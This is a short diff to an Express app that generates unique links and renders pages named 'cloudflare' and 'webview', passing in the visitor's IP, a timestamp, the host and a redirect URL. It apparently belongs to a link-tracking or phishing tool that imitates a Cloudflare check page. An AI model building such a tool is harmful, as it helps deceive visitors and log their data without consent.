@@ -22,6 +22,7 @@ const Url = mongoose.model('Url', urlSchema);
 
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
+app.set('view engine', 'ejs');
 
 app.post('/generate', async (req, res) => {
   try {
@@ -47,7 +48,7 @@ app.get('/c/:id', async (req, res) => {
     const id = req.params.id;
     const url = await Url.findOne({ uniqueId: id });
     if (url) {
-      res.sendFile(path.join(__dirname, 'public', 'cloudflare.html'));
+      res.render('cloudflare', { ip: req.ip, time: new Date().toISOString(), uniqueId: id, a: req.get('host') });
     } else {
       res.status(404).send('Not Found');
     }
@@ -62,7 +63,7 @@ app.get('/w/:id', async (req, res) => {
     const id = req.params.id;
     const url = await Url.findOne({ uniqueId: id });
     if (url) {
-      res.sendFile(path.join(__dirname, 'public', 'webview.html'));
+      res.render('webview', { ip: req.ip, time: new Date().toISOString(), uniqueId: id, a: req.get('host'), url: url.redirectUrl });
     } else {
       res.status(404).send('Not Found');
     }
